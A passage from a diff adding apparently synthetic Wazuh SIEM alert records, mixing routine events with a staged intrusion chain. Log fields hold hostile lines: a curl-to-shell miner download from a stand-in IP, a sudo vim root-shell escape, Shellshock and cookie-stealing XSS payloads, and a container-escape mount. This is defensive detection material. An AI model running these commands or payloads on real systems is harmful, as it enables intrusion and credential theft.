+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "custom_backup"
+    },
+    "full_log": "Sep 30 02:00:10 db-cluster-master backup_script[1204]: PostgreSQL dump of database 'customer_prod' completed in 42 seconds. Archive saved to /mnt/backups/db-20260930.tar.gz",
+    "data": {
+      "status": "SUCCESS",
+      "archive": "/mnt/backups/db-20260930.tar.gz",
+      "elapsed_sec": "42"
+    },
+    "location": "/var/log/backup.log"
+  },
+  {
+    "id": "1790761522.100028",
+    "timestamp": "2026-09-30T03:15:20.100+0000",
+    "rule": {
+      "id": "2902",
+      "level": 3,
+      "description": "dpkg: Package installation or upgrade occurred through package manager",
+      "groups": [
+        "syslog",
+        "dpkg"
+      ],
+      "firedtimes": 12
+    },
+    "agent": {
+      "id": "001",
+      "name": "server-prod-01",
+      "ip": "192.168.1.20"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "dpkg"
+    },
+    "full_log": "Sep 30 03:15:20 server-prod-01 dpkg[3499]: status installed tzdata:all 2026a-0ubuntu0.22.04",
+    "data": {
+      "package": "tzdata",
+      "version": "2026a-0ubuntu0.22.04",
+      "status": "installed"
+    },
+    "location": "/var/log/dpkg.log"
+  },
+  {
+    "id": "1790761522.100029",
+    "timestamp": "2026-09-30T04:00:00.000+0000",
+    "rule": {
+      "id": "60100",
+      "level": 3,
+      "description": "Windows: System was restarted per scheduled maintenance",
+      "groups": [
+        "windows",
+        "system"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "003",
+      "name": "win-dc-01",
+      "ip": "10.0.10.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "The process C:\\Windows\\System32\\shutdown.exe (win-dc-01) has initiated the restart of computer WIN-DC-01 on behalf of user CORP\\DomainAdmin for reason: Operating System: Upgrade (Planned)",
+    "data": {
+      "win": {
+        "eventdata": {
+          "user": "CORP\\DomainAdmin",
+          "reason": "Operating System: Upgrade (Planned)"
+        },
+        "system": {
+          "eventID": "1074",
+          "channel": "System"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100030",
+    "timestamp": "2026-09-30T13:20:00.124+0000",
+    "rule": {
+      "id": "31105",
+      "level": 7,
+      "description": "Apache: Cross-Site Scripting (XSS) payload detected in HTTP query parameter",
+      "groups": [
+        "web",
+        "appsec",
+        "xss"
+      ],
+      "firedtimes": 2,
+      "mitre": {
+        "id": [
+          "T1190"
+        ],
+        "tactic": [
+          "Initial Access"
+        ],
+        "technique": [
+          "Exploit Public-Facing Application"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "web-cluster-01",
+      "ip": "192.168.2.10"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "apache-accesslog"
+    },
+    "full_log": "198.51.100.75 - - [30/Sep/2026:13:20:00 +0000] \"GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1\" 200 4512 \"-\" \"Mozilla/5.0\"",
+    "data": {
+      "srcip": "198.51.100.75",
+      "url": "/search?q=<script>alert(document.cookie)</script>",
+      "action": "GET",
+      "id": "200"
+    },
+    "location": "/var/log/apache2/access.log"
+  },
+  {
+    "id": "1790761522.100031",
+    "timestamp": "2026-09-30T13:25:15.890+0000",
+    "rule": {
+      "id": "5405",
+      "level": 9,
+      "description": "sudo: Interactive root shell spawned from text editor binary execution",
+      "groups": [
+        "syslog",
+        "sudo",
+        "privilege_escalation"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1548.003"
+        ],
+        "tactic": [
+          "Privilege Escalation"
+        ],
+        "technique": [
+          "Sudo and Sudo Caching"
+        ]
+      }
+    },
+    "agent": {
+      "id": "002",
+      "name": "dev-box-03",
+      "ip": "192.168.1.35"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "sudo"
+    },
+    "full_log": "Sep 30 13:25:15 dev-box-03 sudo[2410]: dev_guest : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/vim -c :!/bin/bash",
+    "data": {
+      "srcuser": "dev_guest",
+      "dstuser": "root",
+      "command": "/usr/bin/vim -c :!/bin/bash",
+      "tty": "pts/2"
+    },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "id": "1790761522.100032",
+    "timestamp": "2026-09-30T13:30:44.200+0000",
+    "rule": {
+      "id": "91810",
+      "level": 14,
+      "description": "Sysmon: Process accessed lsass.exe memory with suspicious dump permissions (Mimikatz detected)",
+      "groups": [
+        "windows",
+        "sysmon",
+        "credential_access"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1003.001"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "LSASS Memory"
+        ]
+      }
+    },
+    "agent": {
+      "id": "003",
+      "name": "win-dc-01",
+      "ip": "10.0.10.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Sysmon: Event 10 (ProcessAccess). SourceImage: C:\\Windows\\Temp\\mimi.exe, TargetImage: C:\\Windows\\System32\\lsass.exe, GrantedAccess: 0x1010, CallTrace: C:\\Windows\\Temp\\mimi.exe+0x12a0",
+    "data": {
+      "win": {
+        "eventdata": {
+          "sourceImage": "C:\\Windows\\Temp\\mimi.exe",
+          "targetImage": "C:\\Windows\\System32\\lsass.exe",
+          "grantedAccess": "0x1010"
+        },
+        "system": {
+          "eventID": "10",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100033",
+    "timestamp": "2026-09-30T13:35:10.550+0000",
+    "rule": {
+      "id": "100105",
+      "level": 10,
+      "description": "auditd: Suspicious command pipe detected (curl piping remote script directly into bash)",
+      "groups": [
+        "audit",
+        "execution"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1059.004"
+        ],
+        "tactic": [
+          "Execution"
+        ],
+        "technique": [
+          "Unix Shell"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "server-prod-01",
+      "ip": "192.168.1.20"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "auditd"
+    },
+    "full_log": "type=EXECVE msg=audit(1696080910.550:10041): argc=3 a0=\"bash\" a1=\"-c\" a2=\"curl -fsSL http://198.51.100.200/miner.sh | sh\"",
+    "data": {
+      "audit": {
+        "type": "execve",
+        "command": "curl -fsSL http://198.51.100.200/miner.sh | sh",
+        "euid": "1001"
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "id": "1790761522.100034",
+    "timestamp": "2026-09-30T13:42:01.300+0000",
+    "rule": {
+      "id": "60140",
+      "level": 6,
+      "description": "Windows: Handle to an object was requested with access denied (repeated file access denied)",
+      "groups": [
+        "windows",
+        "object_access"
+      ],
+      "firedtimes": 8,
+      "mitre": {
+        "id": [
+          "T1083"
+        ],
+        "tactic": [
+          "Discovery"
+        ],
+        "technique": [
+          "File and Directory Discovery"
+        ]
+      }
+    },
+    "agent": {
+      "id": "003",
+      "name": "win-dc-01",
+      "ip": "10.0.10.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-Security-Auditing: Event 4656, A handle to an object was requested. Subject: Account Name: guest_intern, Object Name: C:\\Confidential\\Payroll_2026.xlsx, Access Mask: 0x2, Accesses: WriteData, ReturnCode: 0xC0000022 (Access Denied)",
+    "data": {
+      "win": {
+        "eventdata": {
+          "subjectUserName": "guest_intern",
+          "objectName": "C:\\Confidential\\Payroll_2026.xlsx",
+          "returnCode": "0xC0000022"
+        },
+        "system": {
+          "eventID": "4656",
+          "channel": "Security"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100035",
+    "timestamp": "2026-09-30T13:50:22.750+0000",
+    "rule": {
+      "id": "91815",
+      "level": 10,
+      "description": "Sysmon: Registry value set under CurrentVersion\\Run persistence key",
+      "groups": [
+        "windows",
+        "sysmon",
+        "persistence"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1547.001"
+        ],
+        "tactic": [
+          "Persistence"
+        ],
+        "technique": [
+          "Registry Run Keys / Startup Folder"
+        ]
+      }
+    },
+    "agent": {
+      "id": "005",
+      "name": "workstation-hr-12",
+      "ip": "10.0.30.25"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Sysmon: Event 13 (RegistryEvent). TargetObject: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TelemetryUpdater, Details: C:\\Users\\Public\\update.exe",
+    "data": {
+      "win": {
+        "eventdata": {
+          "targetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TelemetryUpdater",
+          "details": "C:\\Users\\Public\\update.exe"
+        },
+        "system": {
+          "eventID": "13",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100036",
+    "timestamp": "2026-09-30T13:55:04.110+0000",
+    "rule": {
+      "id": "550",
+      "level": 13,
+      "description": "Integrity checksum changed: /etc/ld.so.preload created or modified (Possible userland rootkit)",
+      "groups": [
+        "syscheck",
+        "rootcheck",
+        "persistence"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1574.006"
+        ],
+        "tactic": [
+          "Persistence",
+          "Privilege Escalation"
+        ],
+        "technique": [
+          "LD_PRELOAD"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "server-prod-01",
+      "ip": "192.168.1.20"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "syscheck_entry_added"
+    },
+    "full_log": "New file '/etc/ld.so.preload' detected. Points to shared library '/lib/x86_64-linux-gnu/libhook.so'.",
+    "data": {
+      "file": "/etc/ld.so.preload"
+    },
+    "location": "syscheck"
+  },
+  {
+    "id": "1790761522.100037",
+    "timestamp": "2026-09-30T14:02:11.890+0000",
+    "rule": {
+      "id": "502",
+      "level": 5,
+      "description": "Wazuh agent stopped or disconnected unexpectedly",
+      "groups": [
+        "wazuh",
+        "agent_status"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1562.001"
+        ],
+        "tactic": [
+          "Defense Evasion"
+        ],
+        "technique": [
+          "Disable or Modify Tools"
+        ]
+      }
+    },
+    "agent": {
+      "id": "009",
+      "name": "suricata-nids-sensor",
+      "ip": "192.168.1.90"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "wazuh-control"
+    },
+    "full_log": "Wazuh agent stopped: 'suricata-nids-sensor' [id: 009, ip: 192.168.1.90]. Communication lost with manager.",
+    "data": {
+      "agent_id": "009",
+      "status": "disconnected"
+    },
+    "location": "wazuh-monitord"
+  },
+  {
+    "id": "1790761522.100038",
+    "timestamp": "2026-09-30T14:10:45.600+0000",
+    "rule": {
+      "id": "60124",
+      "level": 10,
+      "description": "Windows: Remote Desktop (RDP) multiple logon failures from single external source IP",
+      "groups": [
+        "windows",
+        "rdp",
+        "brute_force"
+      ],
+      "firedtimes": 20,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "Password Guessing"
+        ]
+      }
+    },
+    "agent": {
+      "id": "003",
+      "name": "win-dc-01",
+      "ip": "10.0.10.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-Security-Auditing: Event 4625, An account failed to log on via Terminal Services / RDP. Logon Type: 10, Workstation: DESKTOP-ATTACK, Source Network Address: 198.51.100.111, Target User: Administrator",
+    "data": {
+      "win": {
+        "eventdata": {
+          "ipAddress": "198.51.100.111",
+          "logonType": "10",
+          "targetUserName": "Administrator",
+          "failureReason": "Unknown user name or bad password"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100039",
+    "timestamp": "2026-09-30T14:12:10.150+0000",
+    "rule": {
+      "id": "60106",
+      "level": 11,
+      "description": "Windows: Logon success via Remote Desktop (RDP) following multiple authentication failures",
+      "groups": [
+        "windows",
+        "rdp",
+        "authentication_success"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1078.002"
+        ],
+        "tactic": [
+          "Initial Access"
+        ],
+        "technique": [
+          "Domain Accounts"
+        ]
+      }
+    },
+    "agent": {
+      "id": "003",
+      "name": "win-dc-01",
+      "ip": "10.0.10.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-Security-Auditing: Event 4624, An account was successfully logged on via Terminal Server (Logon Type 10). Target User: svc_admin, Source IP: 198.51.100.111",
+    "data": {
+      "win": {
+        "eventdata": {
+          "ipAddress": "198.51.100.111",
+          "logonType": "10",
+          "targetUserName": "svc_admin"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100040",
+    "timestamp": "2026-09-30T14:20:00.871+0000",
+    "rule": {
+      "id": "550",
+      "level": 13,
+      "description": "File integrity monitoring: Canary file modified with high entropy (.locked extension added)",
+      "groups": [
+        "syscheck",
+        "ransomware"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "agent": {
+      "id": "010",
+      "name": "file-server-01",
+      "ip": "192.168.4.15"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "syscheck_integrity_changed"
+    },
+    "full_log": "Canary file '/shares/documents/readme_corp.docx.locked' modified. Rapid mass modifications detected across SMB volume.",
+    "data": {
+      "file": "/shares/documents/readme_corp.docx.locked",
+      "entropy": "7.98"
+    },
+    "location": "syscheck"
+  },
+  {
+    "id": "1790761522.100041",
+    "timestamp": "2026-09-30T14:20:05.100+0000",
+    "rule": {
+      "id": "550",
+      "level": 14,
+      "description": "File integrity monitoring: Ransom note created (README_RECOVER_FILES.txt)",
+      "groups": [
+        "syscheck",
+        "ransomware"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1486"
+        ],
+        "tactic": [
+          "Impact"
+        ],
+        "technique": [
+          "Data Encrypted for Impact"
+        ]
+      }
+    },
+    "agent": {
+      "id": "010",
+      "name": "file-server-01",
+      "ip": "192.168.4.15"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "syscheck_new_entry"
+    },
+    "full_log": "New file '/shares/documents/README_RECOVER_FILES.txt' detected containing payment instructions.",
+    "data": {
+      "file": "/shares/documents/README_RECOVER_FILES.txt"
+    },
+    "location": "syscheck"
+  },
+  {
+    "id": "1790761522.100042",
+    "timestamp": "2026-09-30T14:31:12.440+0000",
+    "rule": {
+      "id": "100110",
+      "level": 11,
+      "description": "auditd: Unauthorized process attempted read access on /etc/shadow",
+      "groups": [
+        "audit",
+        "credential_access"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1003.008"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "/etc/passwd and /etc/shadow"
+        ]
+      }
+    },
+    "agent": {
+      "id": "002",
+      "name": "dev-box-03",
+      "ip": "192.168.1.35"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "auditd"
+    },
+    "full_log": "type=SYSCALL msg=audit(1696084272.440:11200): arch=c000003e syscall=257 success=no exit=-13 a0=ffffff9c a1=7ffd3a a2=0 a3=0 items=1 ppid=1980 pid=2105 auid=1003 uid=1003 gid=1003 euid=1003 comm=\"cat\" exe=\"/bin/cat\"",
+    "data": {
+      "audit": {
+        "syscall": "openat",
+        "success": "no",
+        "exit": "-13",
+        "file": "/etc/shadow",
+        "comm": "cat",
+        "uid": "1003"
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "id": "1790761522.100043",
+    "timestamp": "2026-09-30T14:40:18.230+0000",
+    "rule": {
+      "id": "5710",
+      "level": 7,
+      "description": "sshd: Failed login attempt for user test from internal workstation (Potential lateral movement)",
+      "groups": [
+        "syslog",
+        "sshd",
+        "lateral_movement"
+      ],
+      "firedtimes": 5,
+      "mitre": {
+        "id": [
+          "T1021.004"
+        ],
+        "tactic": [
+          "Lateral Movement"
+        ],
+        "technique": [
+          "SSH"
+        ]
+      }
+    },
+    "agent": {
+      "id": "008",
+      "name": "db-cluster-master",
+      "ip": "192.168.3.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "sshd"
+    },
+    "full_log": "Sep 30 14:40:18 db-cluster-master sshd[28990]: Failed password for invalid user oracle from 10.0.30.25 port 42890 ssh2",
+    "data": {
+      "srcip": "10.0.30.25",
+      "srcport": "42890",
+      "dstport": "22",
+      "protocol": "tcp",
+      "srcuser": "oracle"
+    },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "id": "1790761522.100044",
+    "timestamp": "2026-09-30T14:48:50.012+0000",
+    "rule": {
+      "id": "31103",
+      "level": 5,
+      "description": "Apache: Multiple 404 Not Found responses (Web vulnerability crawler probe)",
+      "groups": [
+        "web",
+        "reconnaissance"
+      ],
+      "firedtimes": 15,
+      "mitre": {
+        "id": [
+          "T1595.002"
+        ],
+        "tactic": [
+          "Reconnaissance"
+        ],
+        "technique": [
+          "Vulnerability Scanning"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "web-cluster-01",
+      "ip": "192.168.2.10"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "apache-accesslog"
+    },
+    "full_log": "198.51.100.14 - - [30/Sep/2026:14:48:50 +0000] \"GET /phpmyadmin/index.php HTTP/1.1\" 404 196 \"-\" \"Nikto/2.1.6\"",
+    "data": {
+      "srcip": "198.51.100.14",
+      "url": "/phpmyadmin/index.php",
+      "action": "GET",
+      "id": "404"
+    },
+    "location": "/var/log/apache2/access.log"
+  },
+  {
+    "id": "1790761522.100045",
+    "timestamp": "2026-09-30T14:55:10.880+0000",
+    "rule": {
+      "id": "60112",
+      "level": 5,
+      "description": "Windows: A user account was modified (Event ID 4738)",
+      "groups": [
+        "windows",
+        "account_management"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1098"
+        ],
+        "tactic": [
+          "Persistence"
+        ],
+        "technique": [
+          "Account Manipulation"
+        ]
+      }
+    },
+    "agent": {
+      "id": "003",
+      "name": "win-dc-01",
+      "ip": "10.0.10.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-Security-Auditing: Event 4738, A user account was modified. Subject: Account Name: Administrator, Target: Account Name: m_smith, Password Last Set: 9/30/2026 2:55:10 PM",
+    "data": {
+      "win": {
+        "eventdata": {
+          "subjectUserName": "Administrator",
+          "targetUserName": "m_smith"
+        },
+        "system": {
+          "eventID": "4738",
+          "channel": "Security"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100046",
+    "timestamp": "2026-09-30T15:05:22.133+0000",
+    "rule": {
+      "id": "86601",
+      "level": 12,
+      "description": "Suricata: ET TROJAN Observed Cobalt Strike Beacon Request to External C2 IP",
+      "groups": [
+        "ids",
+        "suricata",
+        "trojan"
+      ],
+      "firedtimes": 4,
+      "mitre": {
+        "id": [
+          "T1071.001"
+        ],
+        "tactic": [
+          "Command and Control"
+        ],
+        "technique": [
+          "Web Protocols"
+        ]
+      }
+    },
+    "agent": {
+      "id": "009",
+      "name": "suricata-nids-sensor",
+      "ip": "192.168.1.90"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "json"
+    },
+    "full_log": "{\"timestamp\":\"2026-09-30T15:05:22.133Z\",\"event_type\":\"alert\",\"src_ip\":\"10.0.30.25\",\"src_port\":49811,\"dest_ip\":\"203.0.113.88\",\"dest_port\":80,\"alert\":{\"action\":\"allowed\",\"gid\":1,\"signature_id\":2024890,\"rev\":2,\"signature\":\"ET TROJAN Cobalt Strike Beaconing activity\",\"category\":\"A Network Trojan was detected\",\"severity\":1}}",
+    "data": {
+      "srcip": "10.0.30.25",
+      "dstip": "203.0.113.88",
+      "srcport": "49811",
+      "dstport": "80",
+      "alert": {
+        "signature": "ET TROJAN Cobalt Strike Beaconing activity",
+        "severity": 1
+      }
+    },
+    "location": "/var/log/suricata/eve.json"
+  },
+  {
+    "id": "1790761522.100047",
+    "timestamp": "2026-09-30T15:15:00.005+0000",
+    "rule": {
+      "id": "60105",
+      "level": 12,
+      "description": "Windows: The security audit log was cleared (Event ID 1102)",
+      "groups": [
+        "windows",
+        "security_log",
+        "defense_evasion"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1070.001"
+        ],
+        "tactic": [
+          "Defense Evasion"
+        ],
+        "technique": [
+          "Clear Windows Event Logs"
+        ]
+      }
+    },
+    "agent": {
+      "id": "003",
+      "name": "win-dc-01",
+      "ip": "10.0.10.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-Eventlog: Event 1102, The audit log was cleared. Subject: Security ID: S-1-5-21-12345-500, Account Name: Administrator, Domain: CORP, Logon ID: 0x19284",
+    "data": {
+      "win": {
+        "eventdata": {
+          "subjectUserName": "Administrator",
+          "subjectDomainName": "CORP"
+        },
+        "system": {
+          "eventID": "1102",
+          "channel": "Security"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100048",
+    "timestamp": "2026-09-30T15:22:18.910+0000",
+    "rule": {
+      "id": "550",
+      "level": 8,
+      "description": "Integrity checksum changed: .bash_history file truncated to 0 bytes",
+      "groups": [
+        "syscheck",
+        "defense_evasion"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1070.003"
+        ],
+        "tactic": [
+          "Defense Evasion"
+        ],
+        "technique": [
+          "Clear Command History"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "server-prod-01",
+      "ip": "192.168.1.20"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "syscheck_integrity_changed"
+    },
+    "full_log": "File '/root/.bash_history' size changed from '14520' to '0'. Command history cleared.",
+    "data": {
+      "file": "/root/.bash_history",
+      "size_before": "14520",
+      "size_after": "0"
+    },
+    "location": "syscheck"
+  },
+  {
+    "id": "1790761522.100049",
+    "timestamp": "2026-09-30T15:30:00.000+0000",
+    "rule": {
+      "id": "1002",
+      "level": 2,
+      "description": "System: Chrony / NTP synchronized system clock with upstream time server",
+      "groups": [
+        "syslog",
+        "ntp"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "db-cluster-master",
+      "ip": "192.168.3.5"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "chrony"
+    },
+    "full_log": "Sep 30 15:30:00 db-cluster-master chronyd[610]: Selected source 192.168.1.1 (ntp.corp.internal) - System clock synchronized offset -0.00012s",
+    "data": {
+      "srcip": "192.168.1.1",
+      "offset": "-0.00012s"
+    },
+    "location": "/var/log/syslog"
+  },
+  {
+    "id": "1790761522.100050",
+    "timestamp": "2026-09-30T15:35:40.420+0000",
+    "rule": {
+      "id": "100120",
+      "level": 13,
+      "description": "auditd: Suspicious mount command executed inside container targeting host release_agent",
+      "groups": [
+        "audit",
+        "container_escape",
+        "privilege_escalation"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1611"
+        ],
+        "tactic": [
+          "Privilege Escalation"
+        ],
+        "technique": [
+          "Escape to Host"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "web-cluster-01",
+      "ip": "192.168.2.10"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "auditd"
+    },
+    "full_log": "type=SYSCALL msg=audit(1696088140.420:12891): arch=c000003e syscall=165 comm=\"mount\" exe=\"/bin/mount\" a0=\"cgroup\" a1=\"/tmp/cgrp\" a2=\"cgroup\" a3=\"rdma\"",
+    "data": {
+      "audit": {
+        "syscall": "mount",
+        "comm": "mount",
+        "cwd": "/tmp",
+        "exe": "/bin/mount"
+      }
+    },
+    "location": "/var/log/audit/audit.log"
+  },
+  {
+    "id": "1790761522.100051",
+    "timestamp": "2026-09-30T15:42:10.990+0000",
+    "rule": {
+      "id": "60185",
+      "level": 12,
+      "description": "Windows Defender: Malware detected and quarantined (Trojan:Win32/Wacatac.B!ml)",
+      "groups": [
+        "windows",
+        "defender",
+        "malware"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1204.002"
+        ],
+        "tactic": [
+          "Execution"
+        ],
+        "technique": [
+          "Malicious File"
+        ]
+      }
+    },
+    "agent": {
+      "id": "005",
+      "name": "workstation-hr-12",
+      "ip": "10.0.30.25"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-Windows Defender: Event 1116, Threat detected: Trojan:Win32/Wacatac.B!ml, Severity: Severe, Path: file:_C:\\Users\\m_smith\\Downloads\\invoice_sep.pdf.exe",
+    "data": {
+      "win": {
+        "eventdata": {
+          "threatName": "Trojan:Win32/Wacatac.B!ml",
+          "severity": "Severe",
+          "path": "C:\\Users\\m_smith\\Downloads\\invoice_sep.pdf.exe"
+        },
+        "system": {
+          "eventID": "1116",
+          "channel": "Microsoft-Windows-Windows Defender/Operational"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100052",
+    "timestamp": "2026-09-30T15:50:01.320+0000",
+    "rule": {
+      "id": "5715",
+      "level": 9,
+      "description": "sshd: Direct root login via password authentication",
+      "groups": [
+        "syslog",
+        "sshd",
+        "authentication_success"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1078.001"
+        ],
+        "tactic": [
+          "Initial Access"
+        ],
+        "technique": [
+          "Default Accounts"
+        ]
+      }
+    },
+    "agent": {
+      "id": "001",
+      "name": "server-prod-01",
+      "ip": "192.168.1.20"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "sshd"
+    },
+    "full_log": "Sep 30 15:50:01 server-prod-01 sshd[31002]: Accepted password for root from 198.51.100.99 port 51230 ssh2",
+    "data": {
+      "srcip": "198.51.100.99",
+      "srcport": "51230",
+      "dstport": "22",
+      "protocol": "tcp",
+      "srcuser": "root"
+    },
+    "location": "/var/log/auth.log"
+  },
+  {
+    "id": "1790761522.100053",
+    "timestamp": "2026-09-30T16:01:25.770+0000",
+    "rule": {
+      "id": "31108",
+      "level": 12,
+      "description": "Apache: Remote command execution attempt detected in User-Agent header (Shellshock)",
+      "groups": [
+        "web",
+        "appsec",
+        "rce"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1190"
+        ],
+        "tactic": [
+          "Initial Access"
+        ],
+        "technique": [
+          "Exploit Public-Facing Application"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "web-cluster-01",
+      "ip": "192.168.2.10"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "apache-accesslog"
+    },
+    "full_log": "198.51.100.220 - - [30/Sep/2026:16:01:25 +0000] \"GET /cgi-bin/test.cgi HTTP/1.1\" 500 488 \"-\" \"() { :;}; /bin/bash -c 'id'\"",
+    "data": {
+      "srcip": "198.51.100.220",
+      "url": "/cgi-bin/test.cgi",
+      "action": "GET",
+      "id": "500",
+      "user_agent": "() { :;}; /bin/bash -c 'id'"
+    },
+    "location": "/var/log/apache2/access.log"
+  },
+  {
+    "id": "1790761522.100054",
+    "timestamp": "2026-09-30T16:10:40.110+0000",
+    "rule": {
+      "id": "91820",
+      "level": 13,
+      "description": "PowerShell: Malicious ScriptBlock detected containing Invoke-Mimikatz function invocation",
+      "groups": [
+        "windows",
+        "powershell",
+        "credential_access"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1059.001"
+        ],
+        "tactic": [
+          "Execution"
+        ],
+        "technique": [
+          "PowerShell"
+        ]
+      }
+    },
+    "agent": {
+      "id": "005",
+      "name": "workstation-hr-12",
+      "ip": "10.0.30.25"
+    },
+    "manager": {
+      "name": "wazuh-manager-main"
+    },
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "full_log": "Microsoft-Windows-PowerShell: Event 4104, Execute a Remote Command. ScriptBlock Text: function Invoke-Mimikatz { [CmdletBinding()] Param() ... DumpCreds }",
+    "data": {
+      "win": {
+        "eventdata": {
+          "scriptBlockText": "function Invoke-Mimikatz { DumpCreds }"
+        },
+        "system": {
+          "eventID": "4104",
+          "channel": "Microsoft-Windows-PowerShell/Operational"
+        }
+      }
+    },
+    "location": "EventChannel"
+  },
+  {
+    "id": "1790761522.100055",
